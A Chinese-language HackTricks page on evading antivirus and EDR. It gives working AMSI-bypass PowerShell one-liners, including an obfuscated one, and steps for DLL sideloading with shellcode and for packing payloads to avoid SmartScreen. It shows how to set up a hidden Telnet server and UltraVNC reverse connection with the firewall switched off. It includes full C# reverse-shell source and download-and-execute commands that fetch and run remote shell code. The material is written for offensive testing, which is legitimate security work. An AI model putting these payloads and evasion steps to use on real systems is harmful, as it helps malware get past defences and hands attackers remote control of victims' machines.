# 杀毒软件 (AV) 绕过

<details>

<summary><strong>从零到英雄学习 AWS 黑客技术，参加</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 **HackTricks** 中看到您的**公司广告**或**下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs**](https://opensea.io/collection/the-peass-family) 收藏
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>

**本页由** [**@m2rc\_p**](https://twitter.com/m2rc\_p)** 编写！**

## **AV 绕过方法论**

目前，AV 使用不同的方法来检查文件是否恶意，包括静态检测、动态分析，以及对于更高级的 EDR，行为分析。

### **静态检测**

静态检测是通过标记二进制文件或脚本中已知的恶意字符串或字节序列，以及从文件本身提取信息（例如文件描述、公司名称、数字签名、图标、校验和等）来实现的。这意味着使用已知的公共工具可能会更容易被捕获，因为它们可能已经被分析并标记为恶意。有几种方法可以绕过这种检测：

* **加密**

如果您加密了二进制文件，AV 将无法检测到您的程序，但您需要某种加载器来解密并在内存中运行程序。

* **混淆**

有时您只需要更改二进制文件或脚本中的一些字符串就可以绕过 AV，但这可能是一项耗时的任务，具体取决于您尝试混淆的内容。

* **自定义工具**

如果您开发自己的工具，将没有已知的恶意签名，但这需要大量的时间和努力。

{% hint style="info" %}
检查 Windows Defender 静态检测的好方法是使用 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)。它基本上将文件分割成多个段，然后让 Defender 分别扫描每个段，这样就可以准确地告诉您二进制文件中哪些字符串或字节被标记了。
{% endhint %}

我强烈推荐您查看这个关于实用 AV 绕过的 [YouTube 播放列表](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf)。

### **动态分析**

动态分析是 AV 在沙箱中运行您的二进制文件并监视恶意活动（例如尝试解密并读取您的浏览器密码，对 LSASS 进行小型转储等）。这部分可能更难处理，但这里有一些方法可以绕过沙箱。

* **执行前休眠** 根据实现方式的不同，这可能是绕过 AV 动态分析的好方法。AV 在扫描文件时有非常短的时间，以免打断用户的工作流程，因此使用长时间的休眠可以干扰二进制文件的分析。问题是，许多 AV 的沙箱可以根据实现方式跳过休眠。
* **检查机器资源** 通常沙箱的资源非常有限（例如 < 2GB RAM），否则它们可能会减慢用户机器的速度。在这里，您也可以变得非常有创意，例如通过检查 CPU 的温度甚至风扇速度，沙箱中不会实现所有内容。
* **机器特定检查** 如果您想针对加入 "contoso.local" 域的用户的工作站，您可以检查计算机的域，看它是否与您指定的域匹配，如果不匹配，您可以使程序退出。

事实证明，Microsoft Defender 的沙箱计算机名是 HAL9TH，所以，您可以在恶意软件引爆前检查计算机名，如果名字匹配 HAL9TH，意味着您在 defender 的沙箱内，所以您可以使程序退出。

<figure><img src="../.gitbook/assets/image (3) (6).png" alt=""><figcaption><p>来源：<a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

[@mgeeky](https://twitter.com/mariuszbit) 提供了一些非常好的对抗沙箱的技巧

<figure><img src="../.gitbook/assets/image (2) (1) (1) (2) (1).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev 频道</p></figcaption></figure>

正如我们之前在这篇文章中所说，**公共工具** 最终会**被检测到**，所以，您应该问自己一个问题：

例如，如果您想转储 LSASS，**您真的需要使用 mimikatz 吗**？或者您可以使用一个不太知名但也可以转储 LSASS 的不同项目。

正确答案可能是后者。以 mimikatz 为例，它可能是 AV 和 EDR 最多标记的恶意软件之一，尽管该项目本身非常酷，但要绕过 AV 也是一场噩梦，所以只需寻找您想要实现的替代方案。

{% hint style="info" %}
在修改您的有效载荷以实现逃避时，请确保**关闭 defender 中的自动样本提交**，并且请认真地，**不要上传到 VIRUSTOTAL**，如果您的目标是长期实现逃避。如果您想检查您的有效载荷是否被特定 AV 检测到，请在 VM 上安装它，尝试关闭自动样本提交，并在那里测试，直到您对结果满意为止。
{% endhint %}

## EXEs 与 DLLs

只要有可能，总是**优先使用 DLLs 进行逃避**，根据我的经验，DLL 文件通常**检测率更低**，分析也更少，所以这是一个非常简单的技巧，可以在某些情况下避免检测（当然，如果您的有效载荷有某种方式可以作为 DLL 运行）。

正如我们在这张图片中看到的，Havoc 的 DLL 有效载荷在 antiscan.me 上的检测率为 4/26，而 EXE 有效载荷的检测率为 7/26。

<figure><img src="../.gitbook/assets/image (6) (3) (1).png" alt=""><figcaption><p>antiscan.me 对比正常 Havoc EXE 有效载荷与正常 Havoc DLL</p></figcaption></figure>

现在我们将展示一些您可以使用 DLL 文件来更加隐秘的技巧。

## DLL 侧加载与代理

**DLL 侧加载** 利用加载器使用的 DLL 搜索顺序，通过将受害应用程序和恶意有效载荷放置在彼此旁边来实现。

您可以使用 [Siofra](https://github.com/Cybereason/siofra) 和以下 powershell 脚本检查易受 DLL 侧加载影响的程序：

{% code overflow="wrap" %}
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
```markdown
此命令将输出"C:\Program Files\\"中易受DLL劫持的程序列表及其尝试加载的DLL文件。

我强烈建议你**自己探索可DLL劫持/侧载的程序**，如果操作得当，这种技术相当隐蔽，但如果你使用公开已知的可DLL侧载的程序，你可能很容易被发现。

仅仅放置一个恶意DLL并命名为程序期望加载的名称，并不会加载你的有效载荷，因为程序期望该DLL内有一些特定的函数，为了解决这个问题，我们将使用另一种技术称为**DLL代理/转发**。

**DLL代理**将程序从代理（和恶意）DLL所做的调用转发到原始DLL，从而保留了程序的功能性，并能够处理你的有效载荷的执行。

我将使用[@flangvik](https://twitter.com/Flangvik/)的[SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy)项目

以下是我遵循的步骤：

{% code overflow="wrap" %}
```
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
```markdown
最后一个命令将生成两个文件：一个DLL源代码模板和重命名后的原始DLL。

<figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
{% endcode %}

这些是结果：

<figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

我们的 shellcode（使用 [SGN](https://github.com/EgeBalci/sgn) 编码）和代理 DLL 在 [antiscan.me](https://antiscan.me) 上的检测率为 0/26！我会说这是一个成功。

<figure><img src="../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
我**强烈推荐**你观看 [S3cur3Th1sSh1t 的 twitch VOD](https://www.twitch.tv/videos/1644171543) 关于 DLL Sideloading 的内容，以及 [ippsec 的视频](https://www.youtube.com/watch?v=3eROsG\_WNpE) 来更深入地了解我们讨论的内容。
{% endhint %}

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze 是一个用于绕过 EDR 的 payload 工具包，它使用挂起进程、直接系统调用和替代执行方法`

你可以使用 Freeze 来以隐蔽的方式加载和执行你的 shellcode。
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
规避就像是猫鼠游戏，今天有效的方法明天可能就会被检测到，因此不要只依赖一个工具，如果可能的话，尝试结合多种规避技术。
{% endhint %}

## AMSI（反恶意软件扫描接口）

AMSI 被创建来防止“[无文件恶意软件](https://en.wikipedia.org/wiki/Fileless\_malware)”。最初，杀毒软件只能扫描**磁盘上的文件**，所以如果你能以某种方式**直接在内存中执行有效载荷**，杀毒软件就无能为力了，因为它没有足够的可见性。

AMSI 功能集成在 Windows 的以下组件中。

* 用户账户控制，或 UAC（EXE、COM、MSI 或 ActiveX 安装的提升）
* PowerShell（脚本、交互式使用和动态代码评估）
* Windows 脚本宿主（wscript.exe 和 cscript.exe）
* JavaScript 和 VBScript
* Office VBA 宏

它允许杀毒解决方案通过暴露脚本内容的方式来检查脚本行为，这种形式既未加密也未混淆。

运行 `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` 将在 Windows Defender 上产生以下警报。

<figure><img src="../.gitbook/assets/image (4) (5).png" alt=""><figcaption></figcaption></figure>

注意它是如何在路径前添加 `amsi:`，然后是从中运行脚本的可执行文件的路径，在这个例子中是 powershell.exe

我们没有将任何文件放到磁盘上，但仍然因为 AMSI 而在内存中被捕获。

有几种方法可以绕过 AMSI：

* **混淆**

由于 AMSI 主要是通过静态检测工作的，因此，修改你尝试加载的脚本可以是一种规避检测的好方法。

然而，AMSI 有能力即使是多层混淆的脚本也能解混淆，所以混淆可能是一个不好的选择，这取决于它是如何完成的。这使得规避并不那么直接。尽管如此，有时候，你只需要更改几个变量名就可以了，所以这取决于某件事情被标记的程度。

* **AMSI 绕过**

由于 AMSI 是通过将 DLL 加载到 powershell（也包括 cscript.exe、wscript.exe 等）进程中来实现的，即使作为非特权用户也可以轻松篡改它。由于 AMSI 实现中的这个缺陷，研究人员发现了多种绕过 AMSI 扫描的方法。

**强制错误**

强制 AMSI 初始化失败（amsiInitFailed）将导致不会为当前进程启动扫描。最初这是由 [Matt Graeber](https://twitter.com/mattifestation) 披露的，微软已经开发了一个签名来防止更广泛的使用。

{% code overflow="wrap" %}
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
```markdown
{% endcode %}

只需一行powershell代码，就可以使AMSI对当前powershell进程无效。当然，这行代码已经被AMSI标记，因此需要进行一些修改才能使用这种技术。

这是我从这个[Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)中获取的修改后的AMSI绕过方法。
```
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
请记住，一旦这篇文章发布，这可能会被标记，所以如果你的计划是保持不被发现，你不应该发布任何代码。

**内存打补丁**

这项技术最初是由[@RastaMouse](https://twitter.com/\_RastaMouse/) 发现的，它涉及到找到 amsi.dll（负责扫描用户提供的输入）中 "AmsiScanBuffer" 函数的地址，并将其覆盖为返回 E\_INVALIDARG 代码的指令，这样，实际扫描的结果将返回 0，这被解释为一个干净的结果。

{% hint style="info" %}
请阅读 [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) 以获取更详细的解释。
{% endhint %}

还有许多其他技术可以用来绕过带有 powershell 的 AMSI，查看[**这个页面**](basic-powershell-for-pentesters/#amsi-bypass) 和 [这个仓库](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) 来了解更多关于它们的信息。

或者这个脚本通过内存打补丁将会修补每个新的 Powersh

## 混淆

有几种工具可以用来**混淆 C# 明文代码**，生成**元编程模板**来编译二进制文件或**混淆已编译的二进制文件**，例如：

* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**：C# 混淆器**
* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): 该项目的目标是提供一个开源的 [LLVM](http://www.llvm.org/) 编译套件分支，能够通过[代码混淆](http://en.wikipedia.org/wiki/Obfuscation\_\(software\))和防篡改提高软件安全性。
* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator 展示了如何使用 `C++11/14` 语言在编译时生成混淆代码，而无需使用任何外部工具，也无需修改编译器。
* [**obfy**](https://github.com/fritzone/obfy): 添加由 C++ 模板元编程框架生成的混淆操作层，这将使想要破解应用程序的人的生活变得更加困难。
* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz 是一个 x64 二进制混淆器，能够混淆各种不同的 pe 文件，包括：.exe、.dll、.sys
* [**metame**](https://github.com/a0rtega/metame): Metame 是一个简单的变形代码引擎，适用于任意可执行文件。
* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator 是一个用于 LLVM 支持的语言的细粒度代码混淆框架，使用 ROP（返回导向编程）。ROPfuscator 通过将常规指令转换为 ROP 链来混淆程序，从而在汇编代码级别上混淆程序，挫败我们对正常控制流的自然概念。
* [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt 是用 Nim 编写的 .NET PE 加密器
* [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor 能够将现有的 EXE/DLL 转换为 shellcode 然后加载它们

## SmartScreen & MoTW

当您从互联网下载某些可执行文件并执行它们时，您可能已经看到过这个屏幕。

Microsoft Defender SmartScreen 是一种旨在保护最终用户免受可能恶意应用程序运行的安全机制。

<figure><img src="../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>

SmartScreen 主要采用基于信誉的方法，这意味着不常下载的应用程序将触发 SmartScreen，从而警告并阻止最终用户执行文件（尽管通过点击 More Info -> Run anyway 仍然可以执行文件）。

**MoTW**（网络标记）是一个名为 Zone.Identifier 的 [NTFS 备用数据流](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\))，在从互联网下载文件时会自动创建，以及它的下载来源 URL。

<figure><img src="../.gitbook/assets/image (13) (3).png" alt=""><figcaption><p>检查从互联网下载的文件的 Zone.Identifier ADS。</p></figcaption></figure>

{% hint style="info" %}
重要的是要注意，用**可信**签名证书签名的可执行文件**不会触发 SmartScreen**。
{% endhint %}

防止您的有效载荷获得网络标记的一个非常有效的方法是将它们打包到某种容器中，如 ISO。这是因为网络标记（MOTW）**不能**应用于**非 NTFS**卷。

<figure><img src="../.gitbook/assets/image (12) (2) (2).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) 是一个将有效载荷打包到输出容器中以规避网络标记的工具。

示例用法：
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
以下是使用 [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) 将有效载荷打包到 ISO 文件中以绕过 SmartScreen 的演示。

<figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## C# 程序集反射

在内存中加载 C# 二进制文件已经被人所熟知，这仍然是一个非常好的方法，可以在不被杀毒软件发现的情况下运行你的后渗透工具。

由于有效载荷将直接加载到内存中而不触碰磁盘，我们只需要担心在整个过程中修补 AMSI。

大多数 C2 框架（如 sliver、Covenant、metasploit、CobaltStrike、Havoc 等）已经提供了直接在内存中执行 C# 程序集的能力，但执行方式有所不同：

* **Fork\&Run**

它涉及**生成一个新的牺牲进程**，将你的后渗透恶意代码注入到这个新进程中，执行恶意代码，完成后杀死新进程。这种方法既有好处也有缺点。fork 和 run 方法的好处是执行发生在我们的 Beacon 植入过程**之外**。这意味着如果我们的后渗透行动出了问题或被发现，我们的**植入存活的机会**将**大大增加**。缺点是被**行为检测**发现的机会**更大**。

<figure><img src="../.gitbook/assets/image (7) (1) (3).png" alt=""><figcaption></figcaption></figure>

* **Inline**

它是关于将后渗透恶意代码**注入到自己的进程中**。这样，你可以避免创建新进程并被杀毒软件扫描，但缺点是如果你的有效载荷执行出现问题，你**失去 beacon 的机会**将**大大增加**，因为它可能会崩溃。

<figure><img src="../.gitbook/assets/image (9) (3) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
如果你想了解更多关于 C# 程序集加载的信息，请查看这篇文章 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) 和他们的 InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
{% endhint %}

你也可以**通过 PowerShell** 加载 C# 程序集，查看 [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) 和 [S3cur3th1sSh1t 的视频](https://www.youtube.com/watch?v=oe11Q-3Akuk)。

## 使用其他编程语言

如 [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) 所提议的，通过给受损机器访问**攻击者控制的 SMB 共享上安装的解释器环境**，可以执行恶意代码。

通过允许访问 SMB 共享上的解释器二进制文件和环境，你可以**在受损机器的内存中执行这些语言的任意代码**。

该仓库指出：Defender 仍然会扫描脚本，但通过使用 Go、Java、PHP 等，我们有**更多的灵活性来绕过静态签名**。使用这些语言中的随机未混淆的反向 shell 脚本进行测试已经证明是成功的。

## 高级规避

规避是一个非常复杂的话题，有时你必须考虑到一个系统中的许多不同的遥测源，所以在成熟的环境中完全不被检测到几乎是不可能的。

你对抗的每个环境都会有它们自己的优势和劣势。

我强烈建议你去观看 [@ATTL4S](https://twitter.com/DaniLJ94) 的演讲，以了解更多高级规避技术。

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

这还有另一个关于深度规避的精彩演讲，演讲者是 [@mariuszbit](https://twitter.com/mariuszbit)。

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **旧技术**

### **检查 Defender 认为哪些部分是恶意的**

你可以使用 [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)，它会**移除二进制文件的部分内容**，直到**找出 Defender 认为是恶意的部分**，然后将其分割给你。\
另一个做**同样事情的工具是** [**avred**](https://github.com/dobin/avred)，它在 [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) 提供了一个开放的网络服务。

### **Telnet 服务器**

直到 Windows10，所有 Windows 都带有一个**Telnet 服务器**，你可以（作为管理员）执行以下操作来安装：
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
让它在系统启动时**开始**，并且现在**运行**它：
```bash
sc config TlntSVR start= auto obj= localsystem
```
**更改telnet端口**（隐蔽）并禁用防火墙：
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

从以下链接下载：[http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html)（你需要下载二进制文件，不是安装程序）

**在主机上**：执行 _**winvnc.exe**_ 并配置服务器：

* 启用 _Disable TrayIcon_ 选项
* 在 _VNC Password_ 中设置密码
* 在 _View-Only Password_ 中设置密码

然后，将二进制文件 _**winvnc.exe**_ 和**新创建的**文件 _**UltraVNC.ini**_ 移动到**受害者**的系统内

#### **反向连接**

**攻击者**应在其**主机**内执行二进制文件 `vncviewer.exe -listen 5900`，这样它就会**准备好**捕获反向**VNC连接**。然后，在**受害者**系统内：启动 winvnc 守护进程 `winvnc.exe -run` 并运行 `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**警告：** 为了保持隐蔽，你必须避免做一些事情

* 如果 `winvnc` 已经在运行就不要再启动，否则你会触发一个[弹窗](https://i.imgur.com/1SROTTl.png)。用 `tasklist | findstr winvnc` 检查它是否在运行
* 如果同一目录下没有 `UltraVNC.ini` 就不要启动 `winvnc`，否则会导致[配置窗口](https://i.imgur.com/rfMQWcf.png)打开
* 不要运行 `winvnc -h` 来获取帮助，否则你会触发一个[弹窗](https://i.imgur.com/oc18wcu.png)

### GreatSCT

从以下链接下载：[https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Inside GreatSCT: 在GreatSCT内部：
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
现在使用 `msfconsole -r file.rc` **启动监听器** 并用以下命令**执行** **xml有效载荷**：
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**当前的防御者会非常快地终止进程。**

### 编译我们自己的反向 shell

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 第一个 C# 反向 shell

使用以下命令编译：
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
使用它与：
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
```markdown
### C# 使用编译器
```
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
自动下载和执行：
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
```markdown
{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}

C# 混淆器列表：[https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
### 其他工具

[https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)

Merlin, Empire, Puppy, SalsaTools https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/

[https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)

https://github.com/l0ss/Grouper2

{% embed url="http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html" %}

{% embed url="http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/" %}
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### 更多

{% embed url="https://github.com/persianhydra/Xeexe-TopAntivirusEvasion" %}

<details>

<summary><strong>从零开始学习AWS黑客攻击直到成为专家，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

其他支持HackTricks的方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
